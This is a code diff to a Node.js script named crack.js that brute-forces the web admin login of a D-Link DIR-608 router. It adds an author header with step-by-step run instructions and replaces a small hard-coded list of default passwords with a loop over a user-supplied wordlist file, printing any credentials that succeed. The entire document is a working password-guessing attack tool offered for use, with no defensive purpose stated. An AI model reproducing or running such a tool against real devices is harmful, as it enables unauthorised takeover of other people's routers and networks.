@@ -1,6 +1,39 @@
+/*
+
+Author    :    Marcos Venicius
+GitHub    :    https://github.com/marcos-dev-web
+Instagram :    https://www.instagram.com/marcos.dev.web
+Date      :    29/04/21
+
+----------------------------------------------------
+
+Tested into        :    Wireless - D-Link DIR-608
+Version Hardware   :    A1
+VersionFirmware    :    1.00
+
+node version       :    v14.16.1
+axios version      :    ^0.21.1
+
+Operational System :    Windows 10
+
+----------------------------------------------------
+
+To run
+
+1. yarn install
+  if you not have yarn, npm i -g yarn
+
+2. create a file named passwords.txt and put your paswords.
+  in the terminal type: node crack.js, and wait.
+
+*/
+
+
 const axios = require('axios');
+const fs = require('fs');
 
 const host = '192.168.11.1';  // change it
+const filePasswords = 'passwords.txt'; // put words top to down, one per line
 
 function hex_md5(s) { return rstr2hex(rstr_md5(str2rstr_utf8(s))); }
 function b64_md5(s) { return rstr2b64(rstr_md5(str2rstr_utf8(s))); }
@@ -313,18 +346,22 @@ async function tryLogin(password) {
 	}
 }
 
-// put the possible passwords here
-const passwords = ['admin123', 'Admin', 'admin', 'p@ssw0rd'];
+async function crack(listWords) {
+for (let pass of listWords) {
+    const login = await tryLogin(pass);
+    
+    if (login[0]) {
+      console.log(`\nSuccessfuly login with: [${login[1]}]@[${login[2]}]\n`);
+      break;
+    } else {
+      console.log(`Invalid Credentials: [${login[1]}]@[${login[2]}]`);
+    }
+  }
+}
 
-(async () => {
-	for (let pass of passwords) {
-		const login = await tryLogin(pass);
-		
-		if (login[0]) {
-			console.log(`\nSuccessfuly login with: [${login[1]}]@[${login[2]}]\n`);
-			break;
-		} else {
-			console.log(`Invalid Credentials: [${login[1]}]@[${login[2]}]`);
-		}
-	}
-})();
+fs.readFile(filePasswords, 'utf-8', (a, b) => {
+  const passwords = [...b.split('\r\n')]; // '\r\n' for windows, if is linux, change to '\n'
+  
+  crack(passwords);
+})
+
